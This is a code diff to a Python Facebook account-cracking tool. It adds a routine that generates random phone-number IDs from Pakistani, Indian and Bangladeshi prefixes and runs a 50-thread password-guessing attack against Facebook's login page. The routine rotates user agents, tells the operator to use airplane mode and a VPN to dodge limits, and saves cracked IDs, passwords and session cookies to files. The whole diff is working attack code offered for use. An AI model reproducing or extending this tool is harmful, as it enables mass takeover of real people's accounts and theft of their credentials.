@@ -176,7 +176,7 @@ def menu():
                                 clear()
                                 print(' All method working try 1 by 1 ')
                                 linex()
-                                print(' [1] Method 1 (FOR FREHS ID ) \n [2] Method 2 (Best for India) \n [3] Method 3 (Old Id) \n [4] Method 4 (For Mix Id)')
+                                print(' [1] Method 1 (FOR FREHS ID ) \n [2] Method 2 (Best for India) \n [3] Method 3 (Use Super Vpn) \n [4] Method 4 (For Mix Id)')
                                 linex()
                                 mthd=input(' Choose: ')
                                 linex()
@@ -235,7 +235,7 @@ def menu():
                                                 elif mthd in ['2','02']:
                                                         crack_submit.submit(ffb3,ids,names,passlist)
                                                 elif mthd in ['3','03']:
-                                                        crack_submit.submit(api3,ids,names,passlist)
+                                                        crack_submit.submit(ffb1,ids,names,passlist)
                                                 elif mthd in ['4','04']:
                                                         crack_submit.submit(api2,ids,names,passlist)        
                                                 else:
@@ -266,7 +266,7 @@ def menu():
                                 linex()
                                 x=input(' Choose: ')
                                 if x in ['1','01']:
-                                        pak()
+                                        i()
                                 elif x in ['2','02']:
                                         bd()
                                 elif x in ['3','03']:
@@ -287,9 +287,9 @@ def menu():
         except requests.exceptions.ConnectionError:
                 print('\n No internet connection ...')
                 exit()
-def ffb(ids,names,passlist):
+def ffb1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush() 
+        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush() 
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -519,7 +519,121 @@ def api3(ids,names,passlist):
                 except requests.exceptions.ConnectionError:
                         time.sleep(10)
                 except Exception as e:
-                        pass           
+                        pass
+def i():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    jalan(logo)
+    
+    
+    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
+    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
+    jalan('\033[1;32m============================================')
+    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
+    jalan('\033[1;32m============================================')
+    jalan('\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
+    jalan('\033[1;32m============================================\n')
+    code = input(' PUT CODE : ')
+    print("")
+    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system("clear")
+    print(logo)
+    passx = int(input("[*] Enter Password Limit : "))
+    HamiiID = []
+    print("")
+    for bilal in range(passx):
+        pww = input("[*] Enter Password : ")
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        tl = str(len(user))
+        print('\033[1;36m TOTAL IDS: '+tl)
+        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
+        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
+        print('\033[1;32m============================================')
+        for love in user:
+            pwx = [love[1:]]
+            uid = code+love
+            for Eman in HamiiID:
+                pwx.append(Eman)
+            manshera.submit(rcrack,uid,pwx,tl)
+    print('\033[1;32m============================================')
+    print('Crack process has been completed')
+    print('Ids saved in ok.txt,cp.txt')
+    print('\033[1;32m============================================')
+ 
+def rcrack(uid,pwx,tl):
+    #print(user)
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'free.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="99", "Not)A;Brand";v="8", "Chromium";v="9"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('    \033[1;32m(ARYAN-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                cek_apk(session,coki)
+                open('/sdcard/ARYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('    \33[1;30m(ARYAN-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/ARYAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write('\r     %s[ARYAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
+    except:
+        pass
+                         
                         
 try:
         approval()
